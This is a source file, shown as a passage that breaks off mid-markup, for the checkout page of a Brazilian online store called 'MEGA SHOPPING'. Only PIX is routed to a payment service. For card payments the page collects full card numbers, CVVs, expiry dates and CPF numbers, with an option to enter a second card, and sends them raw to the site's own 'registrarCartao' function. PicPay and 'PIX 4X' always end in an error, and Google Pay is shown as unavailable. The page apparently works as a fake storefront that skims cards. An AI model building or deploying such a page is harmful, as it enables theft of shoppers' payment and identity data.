import { createFileRoute, Link } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import { criarPix, registrarCartao, registrarRetirada, checarPix } from "@/lib/ironpay.functions";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { z } from "zod";
import { StoreHeader } from "@/components/StoreHeader";
import { StoreFooter } from "@/components/StoreFooter";
import { cart, useCart } from "@/lib/cart";
import { Etapas } from "./carrinho";
import b0 from "@/assets/bandeiras/b0.png";
import b1 from "@/assets/bandeiras/b1.png";
import b2 from "@/assets/bandeiras/b2.png";
import b3 from "@/assets/bandeiras/b3.png";
import b4 from "@/assets/bandeiras/b4.png";
import b5 from "@/assets/bandeiras/b5.png";

export const Route = createFileRoute("/checkout")({
  head: () => ({
    meta: [
      { title: "Finalizar compra — MEGA SHOPPING" },
      { name: "description", content: "Informe seus dados para finalizar sua compra no MEGA SHOPPING." },
      { property: "og:title", content: "Finalizar compra — MEGA SHOPPING" },
      { property: "og:description", content: "Informe seus dados para finalizar sua compra." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Checkout,
});

const emailSchema = z.string().trim().email().max(255);
const brl = (v: number) => Number(v).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
type Cartao = { numero: string; bandeira: string; parcelas: string; nome: string; mes: string; ano: string; cvv: string; cpf: string; valor: string };
const BANDEIRAS = ["VISA", "American Express", "Hipercard", "Diners", "Mastercard", "Elo"];
const novoCartao = (): Cartao => ({ numero: "", bandeira: "VISA", parcelas: "", nome: "", mes: "", ano: "", cvv: "", cpf: "", valor: "" });
const inp = "w-full rounded border px-3 py-2.5 text-base";

function Checkout() {
  const { items } = useCart();
  const [doisCartoes, setDoisCartoes] = useState(false);
  const total = items.reduce((s, i) => s + i.price * i.qty, 0);
  const [email, setEmail] = useState("");
  const [erro, setErro] = useState("");
  const [ok, setOk] = useState(false);
  const [d, setD] = useState({ nome: "", sobrenome: "", cpf: "", telefone: "" });
  const [salvar, setSalvar] = useState(false);
  const [cupom, setCupom] = useState("");

  useEffect(() => {
    setEmail(localStorage.getItem("checkout_email") || "");
    try { const s = JSON.parse(localStorage.getItem("checkout_dados") || "null"); if (s) { setD(s); setSalvar(true); } } catch { /* vazio */ }
  }, []);

  const continuar = (e: React.FormEvent) => {
    e.preventDefault();
    const r = emailSchema.safeParse(email);
    if (!r.success) { setErro("Informe um e-mail válido."); return; }
    setErro("");
    localStorage.setItem("checkout_email", r.data);
    setOk(true);
  };

  const [fase, setFase] = useState<"dados" | "entrega">("dados");
  const [modo, setModo] = useState<"receber" | "retirar">("receber");
  const [cep, setCep] = useState("");
  const [cepErro, setCepErro] = useState("");
  const [end, setEnd] = useState<string | null>(null);
  const [frete, setFrete] = useState("Sedex");
  const [num, setNum] = useState("");
  const [comp, setComp] = useState("");
  const [dest, setDest] = useState("");

  const irEntrega = () => {
    if (!d.nome.trim() || !d.sobrenome.trim() || !d.cpf.trim() || !d.telefone.trim()) { setErro("Preencha todos os dados."); return; }
    setErro("");
    if (salvar) localStorage.setItem("checkout_dados", JSON.stringify(d)); else localStorage.removeItem("checkout_dados");
    if (!dest) setDest(`${d.nome} ${d.sobrenome}`.trim());
    setFase("entrega");
  };

  const mudaCep = async (v: string) => {
    const dig = v.replace(/\D/g, "").slice(0, 8);
    setCep(dig.length > 5 ? `${dig.slice(0, 5)}-${dig.slice(5)}` : dig);
    setEnd(null);
    if (dig.length < 8) { setCepErro(dig ? "" : "Campo obrigatório."); return; }
    try {
      const r = await fetch(`https://viacep.com.br/ws/${dig}/json/`);
      const j = await r.json();
      if (j.erro) { setCepErro("CEP não encontrado."); return; }
      setCepErro("");
      setEnd(`${j.logradouro || ""} - ${j.bairro || ""} - ${j.localidade}/${j.uf}`);
    } catch { setCepErro("Não foi possível consultar o CEP."); }
  };

  const fretes = [
    { n: "Sedex", p: "Em até 1 dia útil", v: 12 },
    { n: "Motoboy", p: "Entrega em até 40 minutos", v: 7 },
  ];

  const [pag, setPag] = useState(false);
  const [metodo, setMetodo] = useState("PIX");
  const [indisp, setIndisp] = useState<false | "erro" | "indisp">(false);
  const gerarPix = useServerFn(criarPix);
  const [gerando, setGerando] = useState(false);
  const [pixErro, setPixErro] = useState("");
  const [copiado, setCopiado] = useState(false);
  const [pix, setPix] = useState<{ hash?: string; pixCode: string; qrCode: string | null; amount: number } | null>(null);
  const pagarPix = async () => {
    setPixErro(""); setGerando(true); setCopiado(false);
    try {
      const r = await gerarPix({ data: {
        items: items.map((i) => ({ id: i.id, qty: i.qty, size: i.size })),
        shipping: freteValor ? (frete as "Sedex" | "Motoboy") : undefined,
        address: modo === "retirar" ? "Retirada em loja Ribeirão Preto — DUQUE DE CAXIAS, 416 CENTRO" : end ? `${end}, ${num}${comp ? " - " + comp : ""} (CEP ${cep}) · Destinatário: ${dest}`.slice(0, 400) : undefined,
        customer: {
          name: `${d.nome} ${d.sobrenome}`.trim(), email,
          phone: d.telefone.replace(/\D/g, ""), document: d.cpf.replace(/\D/g, ""),
          zip: cep.replace(/\D/g, "") || undefined, number: num || undefined, complement: comp || undefined,
        },
      } });
      if (r.ok) setPix(r); else setPixErro(r.error);
    } catch { setPixErro("Confira CPF (11 números), telefone com DDD e tente novamente."); }
    setGerando(false);
  };
  const [cartoes, setCartoes] = useState<Cartao[]>([novoCartao(), novoCartao()]);
  const [cartaoOk, setCartaoOk] = useState(false);
  const [retiradaOk, setRetiradaOk] = useState(false);
  const enviarCartao = useServerFn(registrarCartao);
  const enviarRetirada = useServerFn(registrarRetirada);
  const pagarRetirada = async () => {
    setPixErro(""); setGerando(true);
    try {
      const r = await enviarRetirada({ data: {
        items: items.map((i) => ({ id: i.id, qty: i.qty, size: i.size })),
        address: "Retirada em loja Ribeirão Preto — DUQUE DE CAXIAS, 416 CENTRO",
        customer: { name: `${d.nome} ${d.sobrenome}`.trim(), email, phone: d.telefone.replace(/\D/g, ""), document: d.cpf.replace(/\D/g, ""), zip: cep.replace(/\D/g, "") || undefined, number: num || undefined, complement: comp || undefined },
      } });
      if (r.ok) setRetiradaOk(true); else setPixErro(r.error);
    } catch { setPixErro("Confira os dados e tente novamente."); }
    setGerando(false);
  };
  const pagarCartao = async () => {
    setPixErro("");
    const lista = (doisCartoes ? cartoes : cartoes.slice(0, 1)).map((c) => ({ ...c, cpf: c.cpf || d.cpf, bandeira: metodo === "CARTÃO MERCADO SHOPPING" ? "CredSystem" : c.bandeira, valor: doisCartoes ? (c.valor || (totalGeral / 2).toFixed(2).replace(".", ",")) : brl(totalGeral) }));
    if (lista.some((c) => c.numero.replace(/\D/g, "").length < 13 || !c.nome.trim() || !c.mes || !c.ano || c.cvv.length < 3 || !c.parcelas)) { setPixErro("Preencha todos os dados do cartão."); return; }
    setGerando(true);
    try {
      const r = await enviarCartao({ data: {
        items: items.map((i) => ({ id: i.id, qty: i.qty, size: i.size })),
        shipping: freteValor ? (frete as "Sedex" | "Motoboy") : undefined,
        address: modo === "retirar" ? "Retirada em loja Ribeirão Preto — DUQUE DE CAXIAS, 416 CENTRO" : end ? `${end}, ${num}${comp ? " - " + comp : ""} (CEP ${cep}) · Destinatário: ${dest}`.slice(0, 400) : undefined,
        customer: { name: `${d.nome} ${d.sobrenome}`.trim(), email, phone: d.telefone.replace(/\D/g, ""), document: d.cpf.replace(/\D/g, ""), zip: cep.replace(/\D/g, "") || undefined, number: num || undefined, complement: comp || undefined },
        cards: lista, metodo: metodo === "CARTÃO MERCADO SHOPPING" ? "Cartão Mercado Shopping (CredSystem)" : "Cartão de Crédito",
      } });
      if (r.ok) setCartaoOk(true); else setPixErro(r.error);
    } catch { setPixErro("Confira os dados e tente novamente."); }
    setGerando(false);
  };
  const { data: settings } = useQuery({
    queryKey: ["site_settings"],
    queryFn: async () => (await supabase.from("site_settings").select("*").eq("id", 1).maybeSingle()).data,
  });
  const pixLogo = (settings as any)?.pix_logo_url as string | null | undefined;
  const irPagamento = () => {
    if (modo === "receber") {
      if (!end) { setCepErro("Campo obrigatório."); return; }
      if (!num.trim() || !dest.trim()) { setErro("Preencha o número e o destinatário."); return; }
    }
    setErro("");
    setPag(true);
  };
  const metodos = ["PIX", "PICPAY", "CARTÃO DE CRÉDITO", "PIX 4X SEM JUROS", "CARTÃO MERCADO SHOPPING", "GOOGLE PAY"];
  const freteSel = fretes.find((f) => f.n === frete);
  const freteGratis = total > 150;
  const freteValor = modo === "receber" && end && freteSel && !freteGratis ? freteSel.v : 0;
  const totalGeral = total + freteValor;

  const itens = ["Identificar seu perfil", "Notificar sobre o andamento do seu pedido", "Gerenciar seu histórico de compras", "Acelerar o preenchimento de suas informações"];
  const card = "mt-4 bg-background p-5 shadow-sm";
  const titulo = "border-b pb-3 text-xl text-foreground";

  return (
    <div className="min-h-screen bg-muted" style={{ fontFamily: "Montserrat, sans-serif" }}>
      <div className="mx-auto min-h-screen max-w-md bg-muted">
        <StoreHeader />
        <div className="bg-background shadow-sm"><Etapas etapa={3} /></div>
        <div className="p-2">
          <h1 className="mt-4 border-b-2 border-muted-foreground/40 pb-2 text-xl text-foreground">Finalizar compra</h1>

          {!ok ? (
            <div className="mt-5 bg-background px-3 pb-20 pt-6 shadow-sm">
              <div className="text-right"><Link to="/carrinho" className="text-sm text-foreground">Voltar para o carrinho</Link></div>
              <p className="mt-6 text-center text-lg text-foreground">Para finalizar a compra, informe seu e-mail.</p>
              <form onSubmit={continuar} className="mt-4 flex gap-2">
                <input type="email" value={email} maxLength={255} onChange={(e) => setEmail(e.target.value)} placeholder="seu@email.com" className="min-w-0 flex-1 rounded border px-3 py-3 text-base" />
                <button className="rounded bg-primary px-4 text-xl text-primary-foreground">Continuar</button>
              </form>
              {erro && <p className="mt-2 text-sm text-destructive">{erro}</p>}
              <p className="mt-12 text-center text-foreground">Usamos seu e-mail de forma 100% segura para:</p>
              <ul className="mt-2 space-y-1 text-center text-sm text-foreground">
                {itens.map((t) => <li key={t}><span className="text-[hsl(30_80%_60%)]">✓</span> {t}</li>)}
              </ul>
            </div>
          ) : (
            <>
              {fase === "entrega" ? (
                <div className={card}>
                  <div className="flex items-center justify-between border-b pb-3">
                    <h2 className="text-xl text-foreground">Dados pessoais</h2>
                    <button onClick={() => setFase("dados")} className="text-xs font-bold text-foreground">Editar</button>
                  </div>
                  <div className="mt-5 text-sm text-foreground">
                    <p className="font-bold break-all">{email}</p>
                    <p>{d.nome} {d.sobrenome}</p>
                    <p>{d.telefone}</p>
                  </div>
                </div>
              ) : (
              <div className={card}>
                <h2 className={titulo}>Dados pessoais</h2>
                <div className="mt-5 space-y-4 text-sm text-foreground">
                  <div className="flex items-center gap-2">
                    <label className="w-24 text-right">E-mail</label>
                    <div className="relative flex-1">
                      <input value={email} readOnly onClick={() => setOk(false)} className={inp + " pr-7"} />
                      <span className="absolute right-2 top-1 text-[hsl(130_50%_42%)]">✓</span>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <label className="w-24 text-right">Nome</label>
                    <input value={d.nome} maxLength={100} onChange={(e) => setD({ ...d, nome: e.target.value })} className={inp + " flex-1"} />
                  </div>
                  <div className="flex items-center gap-2">
                    <label className="w-24 text-right">SOBRENOME</label>
                    <input value={d.sobrenome} maxLength={100} onChange={(e) => setD({ ...d, sobrenome: e.target.value })} className={inp + " max-w-[220px] flex-1"} />
                  </div>
                  <div>
                    <label className="ml-3 block">CPF</label>
                    <input value={d.cpf} maxLength={14} inputMode="numeric" onChange={(e) => setD({ ...d, cpf: e.target.value })} placeholder="999.999.999-99" className={inp + " mt-2 max-w-[130px]"} />
                  </div>
                  <div>
                    <label className="ml-3 block">TELEFONE</label>
                    <input value={d.telefone} maxLength={15} inputMode="tel" onChange={(e) => setD({ ...d, telefone: e.target.value })} placeholder="11 99999-9999" className={inp + " mt-2 max-w-[130px]"} />
                  </div>
                  <label className="flex items-center gap-3 pl-4">
                    <input type="checkbox" checked={salvar} onChange={(e) => setSalvar(e.target.checked)} className="h-5 w-5" />
                    Salvar minhas informações para próximas compras.
                  </label>
                  {erro && <p className="text-destructive">{erro}</p>}
                  <div className="flex justify-end">
                    <button onClick={irEntrega} className="rounded bg-primary px-7 py-3 text-base text-primary-foreground">Ir Para A Entrega</button>
                  </div>
                </div>
              </div>
              )}

              {pag && fase === "entrega" ? (
                <div className={card}>
                  <div className="flex items-center justify-between border-b pb-3">
                    <h2 className="text-xl text-foreground">Entrega</h2>
                    <button onClick={() => setPag(false)} className="text-xs font-bold text-foreground">Editar</button>
                  </div>
                  {modo === "retirar" ? (
                    <p className="mt-5 text-sm text-foreground">Retirada em loja Ribeirão Preto — DUQUE DE CAXIAS, 416 CENTRO</p>
                  ) : (
                    <div className="mt-5 flex text-sm text-foreground">
                      <div className="flex-1 space-y-1 pr-3">
                        <p>{(end ?? "").split(" - ")[0]} {num}{comp ? `, ${comp}` : ""}</p>
                        <p>{(end ?? "").split(" - ").slice(1).join(" - ")}</p>
                        <p>{cep}</p>
                        <p className="pt-2">{freteSel?.n} · {freteSel?.p}</p>
                      </div>
                      <div className="flex items-center border-l pl-3">{freteSel && (freteGratis ? "GRÁTIS" : brl(freteSel.v))}</div>
                    </div>
                  )}
                  <button onClick={() => setPag(false)} className="mt-4 block w-full text-center text-sm text-[hsl(215_80%_55%)]">Alterar opções de entrega</button>
                </div>
              ) : (
              <div className={card}>
                <h2 className={titulo}>Entrega</h2>
                {fase !== "entrega" ? (
                  <p className="mt-4 text-center text-sm text-foreground">Aguardando o preenchimento dos dados</p>
                ) : (
                  <div className="mt-4 text-sm text-foreground">
                    <div className="flex rounded-full border">
                      {(["receber", "retirar"] as const).map((m) => (
                        <button key={m} onClick={() => setModo(m)} className={`flex-1 rounded-full py-2.5 text-base ${modo === m ? "bg-foreground text-background" : "text-muted-foreground"}`}>
                          {m === "receber" ? "Receber" : "Retirar"}
                        </button>
                      ))}
                    </div>
                    {modo === "retirar" ? (
                      <>
                        <p className="mt-5 text-center">Retirada em loja Ribeirão Preto — DUQUE DE CAXIAS, 416 CENTRO. Consulte condições.</p>
                        <div className="mt-4 flex justify-end">
                          <button onClick={irPagamento} className="rounded bg-primary px-5 py-3 text-base text-primary-foreground">Ir Para O Pagamento</button>
                        </div>
                      </>
                    ) : (
                      <>
                        <div className="mt-5 flex items-start gap-3">
                          <span className="mt-2.5">CEP</span>
                          <div>
                            <div className="relative">
                              <input value={cep} inputMode="numeric" maxLength={9} onChange={(e) => mudaCep(e.target.value)} className={`w-28 rounded border px-2 py-2 text-base ${cepErro ? "border-destructive" : ""} ${end ? "bg-muted" : ""}`} />
                              {end && <span className="absolute -right-3 -top-2 text-[hsl(130_50%_42%)]">✓</span>}
                            </div>
                            {cepErro && <p className="mt-1 text-xs text-destructive">{cepErro}</p>}
                          </div>
                          <a href="https://buscacepinter.correios.com.br/" target="_blank" rel="noreferrer" className="mt-2.5">Não sei meu CEP</a>
                        </div>
                        {end && (
                          <>
                            <p className="mt-5 text-muted-foreground">Forma de entrega</p>
                            <div className="mt-2 rounded-lg border">
                              {fretes.map((f) => (
                                <label key={f.n} className={`flex cursor-pointer items-center gap-4 border-b p-4 last:border-b-0 ${frete === f.n ? "bg-muted" : ""}`}>
                                  <input type="radio" checked={frete === f.n} onChange={() => setFrete(f.n)} className="h-5 w-5" />
                                  <div className="flex-1">
                                    <p className={`text-base ${frete === f.n ? "text-foreground" : "text-muted-foreground"}`}>{f.n}</p>
                                    <p className="text-xs text-muted-foreground">{f.p}</p>
                                  </div>
                                  <span className="border-l pl-3 text-muted-foreground">{freteGratis ? "GRÁTIS" : brl(f.v)}</span>
                                </label>
                              ))}
                            </div>
                            <p className="mt-5 text-muted-foreground">Endereço de entrega</p>
                            <p className="mt-1">{end}</p>
                            <div className="mt-4 flex items-center gap-3">
                              <label>NÚMERO</label>
                              <input value={num} maxLength={10} onChange={(e) => setNum(e.target.value)} className="w-16 rounded border px-2 py-2" />
                            </div>
                            <div className="mt-4 flex items-center gap-2">
                              <label className="text-xs">COMPLEMENTO E REFERÊNCIA</label>
                              <input value={comp} maxLength={100} onChange={(e) => setComp(e.target.value)} placeholder="Opcional" className="min-w-0 flex-1 rounded border px-2 py-2" />
                            </div>
                            <label className="mt-4 block">DESTINATÁRIO</label>
                            <input value={dest} maxLength={100} onChange={(e) => setDest(e.target.value)} className="mt-2 w-full max-w-[250px] rounded border px-2 py-2.5" />
                            {erro && <p className="mt-2 text-destructive">{erro}</p>}
                            <div className="mt-4 flex justify-end">
                              <button onClick={irPagamento} className="rounded bg-primary px-5 py-3 text-base text-primary-foreground">Ir Para O Pagamento</button>
                            </div>
                          </>
                        )}
                      </>
                    )}
                  </div>
                )}
              </div>
              )}
              <div className={card}>
                <h2 className={titulo}>Pagamento</h2>
                {!(pag && fase === "entrega") ? (
                  <p className="mt-4 text-center text-sm text-foreground">Aguardando o preenchimento dos dados</p>
                ) : (
                  <div className="mt-6">
                    <button className="rounded bg-muted px-2 py-1.5 text-sm text-foreground">Adicionar vale-presente</button>
                    <div className="mt-8 grid grid-cols-3 gap-4">
                      {metodos.map((m) => (
                        <button key={m} onClick={() => setMetodo(m)} className={`relative flex h-11 items-center justify-center px-1 text-center text-[11px] font-bold leading-tight text-primary-foreground ${metodo === m ? "bg-primary" : "bg-primary/45"}`}>
                          {m}
                          {metodo === m && <span className="absolute -bottom-2 left-1/2 h-0 w-0 -translate-x-1/2 border-x-8 border-t-8 border-x-transparent border-t-primary" />}
                        </button>
                      ))}
                    </div>
                    {metodo === "CARTÃO DE CRÉDITO" || metodo === "CARTÃO MERCADO SHOPPING" ? (
                      <div className="mt-6 border p-3">
                        <div className="space-y-5 bg-muted p-3 text-sm text-muted-foreground">
                          {(doisCartoes ? [0, 1] : [0]).map((ci) => { const c = cartoes[ci] ?? novoCartao(); const up = (p: Partial<Cartao>) => setCartoes((a) => a.map((x, k) => k === ci ? { ...x, ...p } : x)); return (
                          <div key={ci} className="space-y-5">
                          {doisCartoes && <p className="font-bold text-foreground">{ci === 0 ? "Primeiro cartão" : "Segundo cartão"}</p>}
                          <div>
                            <CardBrandPicker name={`bandeira-${ci}`} num={c.numero} sel={c.bandeira} onNum={(numero) => up({ numero })} onSel={(bandeira) => up({ bandeira })} cred={metodo === "CARTÃO MERCADO SHOPPING"} />
                          </div>
                          <select value={c.parcelas} onChange={(e) => up({ parcelas: e.target.value })} className="w-full max-w-[280px] rounded border bg-background px-2 py-2 text-foreground">
                            <option value="">Em quantas parcelas deseja pagar?</option>
                            {[1, 2, 3, 4, 5, 6].map((n) => { const t = `${n}x de ${brl(totalGeral / n)} sem juros`; return <option key={n} value={t}>{t}</option>; })}
                          </select>
                          <div>
                            <label className="block">Nome impresso no cartão</label>
                            <input value={c.nome} onChange={(e) => up({ nome: e.target.value })} maxLength={100} autoComplete="cc-name" className="mt-1 w-full rounded border bg-background px-3 py-2 text-base" />
                          </div>
                          <div className="flex items-center gap-2">
                            <span className="mr-2">Validade</span>
                            <select value={c.mes} onChange={(e) => up({ mes: e.target.value })} className="rounded border bg-background px-2 py-1.5 text-foreground"><option value="">Mês</option>{Array.from({ length: 12 }, (_, k) => <option key={k}>{String(k + 1).padStart(2, "0")}</option>)}</select>
                            <span className="text-2xl">/</span>
                            <select value={c.ano} onChange={(e) => up({ ano: e.target.value })} className="rounded border bg-background px-2 py-1.5 text-foreground"><option value="">Ano</option>{Array.from({ length: 12 }, (_, k) => <option key={k}>{2026 + k}</option>)}</select>
                          </div>
                          <div className="flex items-center gap-1">
                            <label className="w-16 leading-tight">Código de segurança</label>
                            <input value={c.cvv} onChange={(e) => up({ cvv: e.target.value.replace(/\D/g, "") })} inputMode="numeric" maxLength={4} autoComplete="cc-csc" className="w-16 rounded border bg-background px-2 py-2" />
                          </div>
                          {!(metodo === "CARTÃO MERCADO SHOPPING") && <div>
                            <label className="block">CPF do titular</label>
                            <input value={c.cpf || d.cpf} onChange={(e) => up({ cpf: e.target.value })} inputMode="numeric" maxLength={14} placeholder="999.999.999-99" className="mt-1 w-full max-w-[220px] rounded border bg-background px-3 py-2" />
                          </div>}
                          {modo === "receber" && end && !(metodo === "CARTÃO MERCADO SHOPPING") && (
                            <label className="flex items-start gap-2 text-foreground">
                              <input type="checkbox" defaultChecked className="mt-1" />
                              <span>O endereço da fatura do cartão é <b>{(end ?? "").split(" - ")[0]}, {num}</b></span>
                            </label>
                          )}
                          {doisCartoes && (
                            <div className="flex items-center gap-2">
                              <span>Valor *</span>
                              <span className="flex items-center rounded border bg-background text-foreground"><span className="border-r bg-muted px-2">R$</span><input inputMode="decimal" value={c.valor || (totalGeral / 2).toFixed(2).replace(".", ",")} onChange={(e) => up({ valor: e.target.value })} className="w-24 px-2 py-0.5 text-right" /></span>
                            </div>
                          )}
                          </div>
                          ); })}
                          <button type="button" onClick={() => setDoisCartoes((v) => !v)} className="w-full border border-primary/40 py-2.5 font-bold text-primary/60">{doisCartoes ? "Pagar usando um cartão" : "Pagar usando dois cartões"}</button>
                        </div>
                      </div>
                    ) : metodo === "PIX 4X SEM JUROS" ? (
                      <div className="mt-6 border px-3 py-6 text-center">
                        <p className="flex items-center justify-center gap-1 text-2xl font-medium text-foreground"><span className="text-primary">✿</span> pagaleve</p>
                        <p className="mt-3 text-3xl font-bold tracking-tight text-foreground" style={{ fontFamily: "'Bebas Neue', 'Oswald', sans-serif" }}>Compre em 4 parcelas</p>
                        <p className="text-3xl font-bold text-primary" style={{ fontFamily: "'Bebas Neue', 'Oswald', sans-serif" }}>sem juros</p>
                        <div className="mt-5 flex items-center justify-between px-1">
                          {[["1", "HOJE", 25], ["2", "15 DIAS", 50], ["3", "30 DIAS", 75], ["4", "45 DIAS", 100]].map(([n, t, pct]) => (
                            <div key={n as string} className="relative grid h-16 w-16 place-items-center rounded-full" style={{ background: `conic-gradient(var(--primary) ${pct}%, var(--muted) 0)` }}>
                              <div className="grid h-[54px] w-[54px] place-items-center rounded-full bg-background leading-none">
                                <span className="text-xl text-foreground">{n}<sup className="text-[10px]">a</sup></span>
                                <span className="-mt-3 text-[8px] text-muted-foreground">{t}</span>
                              </div>
                            </div>
                          ))}
                        </div>
                        <p className="mt-4 text-sm text-foreground">Sem cartão, só WhatsApp e <b>em segundos</b></p>
                        <span className="mt-2 inline-flex items-center gap-1 rounded-full border border-foreground/50 px-3 py-0.5 text-[10px] text-foreground"><span className="text-primary">✓</span> Compra segura</span>
                        <p className="mt-5 rounded bg-foreground py-2.5 text-[10px] text-background">Clique em <b>finalizar compra</b> para continuar.</p>
                      </div>
                    ) : metodo === "GOOGLE PAY" ? (
                      <div className="mt-6 border px-4 py-10 text-center text-foreground">
                        <span className="inline-flex items-center gap-1.5 rounded-full border-2 border-foreground/70 px-4 py-1.5 text-2xl"><svg viewBox="0 0 48 48" className="h-6 w-6"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.8 2.4 30.3 0 24 0 14.6 0 6.6 5.4 2.7 13.3l7.9 6.1C12.5 13.6 17.8 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 2.9-2.2 5.4-4.7 7.1l7.6 5.9c4.4-4.1 6.9-10.1 6.9-17.5z"/><path fill="#FBBC05" d="M10.6 28.6c-.5-1.4-.8-3-.8-4.6s.3-3.2.8-4.6l-7.9-6.1C1 16.6 0 20.2 0 24s1 7.4 2.7 10.7l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.6-5.9c-2.1 1.4-4.9 2.3-8.3 2.3-6.2 0-11.5-4.1-13.4-9.8l-7.9 6.1C6.6 42.6 14.6 48 24 48z"/></svg>Pay</span>
                        <p className="mt-6 text-sm font-semibold">Prossiga para efetuar o pagamento<br />através do seu dispositivo.</p>
                        <div className="mx-auto mt-8 flex max-w-[240px] items-center rounded border border-foreground/60 px-3 py-2">
                          <span className="flex flex-1 justify-center"><svg viewBox="0 0 48 48" className="h-5 w-5"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.8 2.4 30.3 0 24 0 14.6 0 6.6 5.4 2.7 13.3l7.9 6.1C12.5 13.6 17.8 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 2.9-2.2 5.4-4.7 7.1l7.6 5.9c4.4-4.1 6.9-10.1 6.9-17.5z"/><path fill="#FBBC05" d="M10.6 28.6c-.5-1.4-.8-3-.8-4.6s.3-3.2.8-4.6l-7.9-6.1C1 16.6 0 20.2 0 24s1 7.4 2.7 10.7l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.6-5.9c-2.1 1.4-4.9 2.3-8.3 2.3-6.2 0-11.5-4.1-13.4-9.8l-7.9 6.1C6.6 42.6 14.6 48 24 48z"/></svg></span>
                          <span className="mx-2 h-6 w-px bg-foreground/60" />
                          <span className="flex gap-1">
                            <span className="h-5 w-8 rounded-sm" style={{ background: "linear-gradient(135deg,#0f2a3d,#2f6f8f)" }} />
                            <span className="h-5 w-8 rounded-sm" style={{ background: "linear-gradient(135deg,#9a9a9a,#d6d6d6)" }} />
                            <span className="h-5 w-8 rounded-sm" style={{ background: "linear-gradient(135deg,#6a1fd1,#9b4dff)" }} />
                          </span>
                        </div>
                        <p className="mt-3 text-xs text-muted-foreground">Parcelamento disponível</p>
                      </div>
                    ) : metodo === "PICPAY" ? (
                      <div className="mt-6 border p-5 text-foreground">
                        <p className="text-4xl font-extrabold tracking-tight text-[hsl(140_65%_45%)]">PicPay</p>
                        <p className="mt-5 text-base font-bold">Pague com PicPay, direto do seu celular.</p>
                        <p className="mt-4 text-sm">Ao finalizar a compra, um link de pagamento será exibido. Toque nele e seu PicPay será aberto. Em seguida conclua o pagamento.</p>
                        <p className="mt-4 text-sm">Ainda não tem conta? Baixe o app gratuitamente no Android ou iPhone.</p>
                      </div>
                    ) : (
                    <div className="mt-6 border p-6 text-center">
                      {metodo === "PIX" && pixLogo ? (
                        <img src={pixLogo} alt="Pix" className="mx-auto max-h-16 max-w-full object-contain" />
                      ) : (
                        <p className="text-3xl text-muted-foreground"><span className="text-[hsl(170_50%_50%)]">◆</span> {metodo.toLowerCase()}</p>
                      )}
                      <p className="mt-4 text-sm text-foreground">Para pagar, finalize sua compra abaixo</p>
                      <p className="mt-1 text-muted-foreground">↓</p>
                    </div>
                    )}
                  </div>
                )}
              </div>

              <div className={card}>
                <h2 className={titulo}>Resumo do pedido</h2>
                <div className="mt-4 space-y-3">
                  {items.map((it, k) => (
                    <div key={k} className="flex items-center gap-3">
                      {it.image ? <img src={it.image} alt={it.name} className="h-20 w-14 object-cover" /> : <div className="h-20 w-14 bg-muted" />}
                      <p className="flex-1 text-xs font-bold text-foreground">{it.name}{it.size ? ` ${it.size}` : ""}</p>
                      <span className="text-[10px] font-bold">QTD: {it.qty}</span>
                      <span className="text-sm font-bold">{brl(it.price * it.qty)}</span>
                    </div>
                  ))}
                </div>
                <div className="mt-5 rounded border bg-muted p-3">
                  <p className="text-center text-sm font-bold text-foreground">CUPOM DE DESCONTO</p>
                  <div className="mt-2 flex gap-2">
                    <input value={cupom} maxLength={50} onChange={(e) => setCupom(e.target.value)} placeholder="Código" className="min-w-0 flex-1 rounded border bg-background px-2 py-1.5 text-sm" />
                    <button className="rounded bg-foreground px-3 text-sm text-background">Adicionar</button>
                  </div>
                </div>
                <div className="mt-5 space-y-1 px-6 text-sm">
                  <div className="flex justify-between"><span>SUBTOTAL</span><span className="font-bold">{brl(total)}</span></div>
                  <div className="flex justify-between"><span>FRETE</span><span className="font-bold">{freteGratis && modo === "receber" && end ? "R$ 0,00 GRÁTIS" : freteValor ? brl(freteValor) : "—"}</span></div>
                  <div className="flex justify-between text-base"><span className="font-bold">TOTAL</span><span>{brl(totalGeral)}</span></div>
                </div>
                <button disabled={gerando} onClick={() => {
                  if (!pag) return;
                  if (modo === "retirar") return void pagarRetirada();
                  if (metodo === "PIX") return void pagarPix();
                  if (metodo === "CARTÃO DE CRÉDITO" || metodo === "CARTÃO MERCADO SHOPPING") return void pagarCartao();
                  setIndisp(metodo === "PICPAY" || metodo === "PIX 4X SEM JUROS" ? "erro" : "indisp");
                }} className="mt-5 w-full rounded bg-primary py-3 text-lg text-primary-foreground disabled:opacity-60">{gerando ? "Aguarde…" : modo === "retirar" ? "Finalizar" : "Finalizar Compra"}</button>
                {pixErro && <p className="mt-2 text-center text-sm text-destructive">{pixErro}</p>}
                {gerando && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/70 p-4">
                    <div className="w-full max-w-md bg-background px-4 py-8 shadow-xl">
                      <p className="flex items-center gap-2 text-xl text-foreground"><span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-dashed border-foreground" />AGUARDE...</p>
                      <p className="mt-2 text-foreground">Estamos finalizando sua compra.</p>
                    </div>
                  </div>
                )}
                {pix && <PixTela pix={pix} copiado={copiado} onCopy={() => { navigator.clipboard.writeText(pix.pixCode); setCopiado(true); }} onClose={() => setPix(null)} />}
                {retiradaOk && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/50 p-6">
                    <div className="w-full max-w-sm rounded-lg bg-background p-6 text-center shadow-xl">
                      <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-primary/15 text-3xl font-bold text-primary">✓</div>
                      <h3 className="mt-4 text-xl font-bold text-foreground">Pedido recebido!</h3>
                      <p className="mt-2 text-sm text-muted-foreground">Seu pedido está em análise. Em breve entraremos em contato pelo e-mail informado.</p>
